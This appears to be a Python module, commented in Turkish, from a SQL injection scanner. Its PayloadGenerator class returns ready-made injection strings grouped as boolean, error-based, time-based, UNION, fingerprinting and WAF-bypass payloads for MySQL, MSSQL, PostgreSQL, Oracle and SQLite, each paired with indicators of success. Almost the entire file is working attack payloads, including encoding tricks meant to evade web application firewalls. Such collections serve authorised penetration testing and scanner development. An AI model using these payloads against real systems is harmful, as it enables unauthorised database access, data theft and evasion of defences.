"""
SQL Injection payload generator module
"""
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class SQLInjectionType(Enum):
    """SQL Injection türleri"""
    BOOLEAN = "boolean"
    ERROR = "error"
    TIME = "time"
    UNION = "union"
    STACKED = "stacked"

class DatabaseType(Enum):
    """Veritabanı türleri"""
    MYSQL = "mysql"
    MSSQL = "mssql"
    POSTGRESQL = "postgresql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"

@dataclass
class SQLInjectionPayload:
    """SQL Injection payload veri sınıfı"""
    value: str
    injection_type: SQLInjectionType
    dbms: DatabaseType
    description: str
    success_indicators: List[str]
    error_patterns: Optional[List[str]] = None

class PayloadGenerator:
    """SQL Injection payload üreteci"""
    
    @staticmethod
    def get_boolean_payloads() -> List[SQLInjectionPayload]:
        """Boolean-based SQL injection payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="' OR '1'='1",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="Basit OR operatörü enjeksiyonu",
                success_indicators=["true", "1=1"]
            ),
            SQLInjectionPayload(
                value="' OR 1=1--",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="Yorum ile OR operatörü enjeksiyonu",
                success_indicators=["true", "1=1"]
            ),
            SQLInjectionPayload(
                value="admin' OR '1'='1'#",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.MYSQL,
                description="MySQL yorum karakteri ile enjeksiyon",
                success_indicators=["true", "1=1"]
            ),
            SQLInjectionPayload(
                value="' OR 'x'='x",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="Alternatif karakter ile OR enjeksiyonu",
                success_indicators=["true", "x=x"]
            ),
            SQLInjectionPayload(
                value="' OR 1=1 AND '1'='1",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="AND operatörü ile zincirleme enjeksiyon",
                success_indicators=["true", "1=1"]
            ),
            SQLInjectionPayload(
                value="admin') OR ('1'='1",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="Parantezli OR enjeksiyonu",
                success_indicators=["true", "1=1"]
            ),
            SQLInjectionPayload(
                value="' OR 1 IN (1)--",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.GENERIC,
                description="IN operatörü ile enjeksiyon",
                success_indicators=["true", "1=1"]
            )
        ]
        return payloads

    @staticmethod
    def get_error_payloads() -> List[SQLInjectionPayload]:
        """Error-based SQL injection payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="' AND CAST((SELECT version()) AS int)--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.POSTGRESQL,
                description="PostgreSQL versiyon hatası",
                success_indicators=[],
                error_patterns=["invalid input syntax", "cannot cast type"]
            ),
            SQLInjectionPayload(
                value="' AND 1=CONVERT(int, @@version)--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.MSSQL,
                description="MSSQL dönüşüm hatası",
                success_indicators=[],
                error_patterns=["convert", "data type"]
            ),
            SQLInjectionPayload(
                value="' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.MYSQL,
                description="MySQL EXTRACTVALUE hatası",
                success_indicators=[],
                error_patterns=["XPATH syntax error"]
            ),
            SQLInjectionPayload(
                value="' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.ORACLE,
                description="Oracle UTL_INADDR hatası",
                success_indicators=[],
                error_patterns=["ORA-", "TNS-"]
            ),
            SQLInjectionPayload(
                value="' AND 1=ctxsys.drithsx.sn(1, (SELECT banner FROM v$version WHERE rownum=1))--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.ORACLE,
                description="Oracle CTXSYS hatası",
                success_indicators=[],
                error_patterns=["ORA-", "TNS-"]
            )
        ]
        return payloads

    @staticmethod
    def get_time_payloads() -> List[SQLInjectionPayload]:
        """Time-based SQL injection payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="'; IF (1=1) WAITFOR DELAY '0:0:5'--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.MSSQL,
                description="MSSQL zaman gecikmesi",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="'; SELECT SLEEP(5)--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.MYSQL,
                description="MySQL zaman gecikmesi",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="'; SELECT pg_sleep(5)--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.POSTGRESQL,
                description="PostgreSQL zaman gecikmesi",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="'; DBMS_LOCK.SLEEP(5)--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.ORACLE,
                description="Oracle zaman gecikmesi",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.POSTGRESQL,
                description="PostgreSQL koşullu zaman gecikmesi",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="'; SELECT IF(1=1,SLEEP(5),0)--",
                injection_type=SQLInjectionType.TIME,
                dbms=DatabaseType.MYSQL,
                description="MySQL koşullu zaman gecikmesi",
                success_indicators=["timeout"]
            )
        ]
        return payloads

    @staticmethod
    def get_union_payloads() -> List[SQLInjectionPayload]:
        """UNION-based SQL injection payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="' UNION SELECT NULL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.GENERIC,
                description="Tek sütun UNION enjeksiyonu",
                success_indicators=["null"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT NULL,NULL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.GENERIC,
                description="İki sütun UNION enjeksiyonu",
                success_indicators=["null"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT @@version,NULL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.MSSQL,
                description="MSSQL versiyon bilgisi çıkarımı",
                success_indicators=["microsoft", "sql server"]
            ),
            SQLInjectionPayload(
                value="' UNION ALL SELECT NULL,NULL,NULL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.GENERIC,
                description="Üç sütun UNION ALL enjeksiyonu",
                success_indicators=["null"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT CHAR(113)+CHAR(118)+CHAR(112),NULL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.MSSQL,
                description="MSSQL karakter birleştirme",
                success_indicators=["qvp"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT CHR(113)||CHR(118)||CHR(112),NULL FROM DUAL--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.ORACLE,
                description="Oracle karakter birleştirme",
                success_indicators=["qvp"]
            )
        ]
        return payloads

    @staticmethod
    def get_fingerprint_payloads() -> List[SQLInjectionPayload]:
        """Veritabanı parmak izi payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="' AND @@version--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.MSSQL,
                description="MSSQL versiyon tespiti",
                success_indicators=["microsoft", "sql server"]
            ),
            SQLInjectionPayload(
                value="' AND version()--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.MYSQL,
                description="MySQL versiyon tespiti",
                success_indicators=["mysql"]
            ),
            SQLInjectionPayload(
                value="' AND sqlite_version()--",
                injection_type=SQLInjectionType.ERROR,
                dbms=DatabaseType.SQLITE,
                description="SQLite versiyon tespiti",
                success_indicators=["sqlite"]
            )
        ]
        return payloads

    @staticmethod
    def get_waf_bypass_payloads() -> List[SQLInjectionPayload]:
        """WAF bypass SQL injection payloadları"""
        payloads = [
            SQLInjectionPayload(
                value="/*!50000SELECT*/",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.MYSQL,
                description="MySQL yorum bypass",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="'+/*!UnIoN*/+/*!SeLeCt*/+1,2,3--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.MYSQL,
                description="MySQL UNION bypass",
                success_indicators=["null"]
            ),
            SQLInjectionPayload(
                value="'; %00SELECT%00 1,2,3--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.GENERIC,
                description="Null byte bypass",
                success_indicators=["null"]
            ),
            SQLInjectionPayload(
                value="'; SeLeCt@{x}:=1--",
                injection_type=SQLInjectionType.BOOLEAN,
                dbms=DatabaseType.MYSQL,
                description="MySQL değişken atama bypass",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="'; %55nion(%53elect) 1,2,3--",
                injection_type=SQLInjectionType.UNION,
                dbms=DatabaseType.GENERIC,
                description="URL encoding bypass",
                success_indicators=["null"]
            )
        ]
        return payloads 